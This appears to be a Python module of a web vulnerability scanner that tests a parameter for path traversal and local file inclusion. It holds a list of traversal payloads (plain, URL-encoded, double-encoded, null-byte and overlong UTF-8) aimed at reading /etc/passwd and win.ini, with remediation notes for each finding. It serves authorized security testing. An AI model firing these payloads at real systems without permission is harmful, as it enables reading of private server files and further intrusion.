"""
modules/lfi.py
Path Traversal / Local File Inclusion (LFI) test module.

Entry point: async def run(scanner) -> None

For Authorized Security Testing and CTF Competitions Only.
"""
from __future__ import annotations

import urllib.parse
from typing import TYPE_CHECKING

from core.models import Vulnerability, calculate_severity

if TYPE_CHECKING:
    from core.scanner import BaseScanner

# ── Payload list: (traversal_path, signature_in_file_content) ─────────────────
LFI_PAYLOADS = [
    # Linux /etc/passwd
    ("../etc/passwd", "root:"),
    ("../../etc/passwd", "root:"),
    ("../../../etc/passwd", "root:"),
    ("../../../../etc/passwd", "root:"),
    ("../../../../../etc/passwd", "root:"),
    ("../../../../../../etc/passwd", "root:"),
    ("../../../../../../../etc/passwd", "root:"),
    # Encoded variants
    ("..%2Fetc%2Fpasswd", "root:"),
    ("%2F..%2F..%2Fetc%2Fpasswd", "root:"),
    ("..%252Fetc%252Fpasswd", "root:"),
    # Null-byte bypass (PHP < 5.3.4)
    ("../etc/passwd\x00", "root:"),
    ("../../../etc/passwd%00", "root:"),
    # Overlong UTF-8
    ("..%c0%afetc%c0%afpasswd", "root:"),
    ("..%ef%bc%8fetc%ef%bc%8fpasswd", "root:"),
    # Double dot tricks
    ("....//etc/passwd", "root:"),
    ("....\\\\etc/passwd", "root:"),
    # Absolute
    ("/etc/passwd", "root:"),
    ("%2Fetc%2Fpasswd", "root:"),
    # Windows
    ("C:\\Windows\\win.ini", "[extensions]"),
    ("..\\..\\..\\Windows\\win.ini", "[extensions]"),
    # Juice Shop specific
    ("ftp/", "acquisitions"),
    ("../ftp/", "acquisitions"),
]


async def run(scanner: "BaseScanner", url: str, param: str, method: str = "GET") -> None:
    """Test a single parameter for LFI. Called per-param by scan_url()."""
    await _test_lfi(scanner, url, param, method)


async def _test_lfi(scanner: "BaseScanner", url: str, param: str, method: str) -> bool:
    for payload, signature in LFI_PAYLOADS:
        # Test raw, single-encoded, and double-encoded variants
        for variant in [
            payload,
            urllib.parse.quote(payload),
            urllib.parse.quote(urllib.parse.quote(payload)),
        ]:
            res = await scanner.make_request(method, url, params={param: variant})
            if res and signature.lower() in res.text.lower():
                severity, cvss = calculate_severity("Path Traversal")
                scanner.log_vuln(Vulnerability(
                    type="Path Traversal / LFI",
                    url=url,
                    parameter=param,
                    payload=variant,
                    evidence=f"File signature '{signature}' found in response",
                    confidence="High",
                    severity=severity,
                    cvss_score=cvss,
                    method=method,
                    detection_method="File content signature matching (raw + URL-encoded variants)",
                    remediation=(
                        "Validate and sanitize file paths server-side. "
                        "Use an allowlist of permitted file names/directories. "
                        "Resolve canonical paths before comparison."
                    ),
                    references=["CWE-22", "OWASP-A01:2021"],
                ))
                return True
    return False
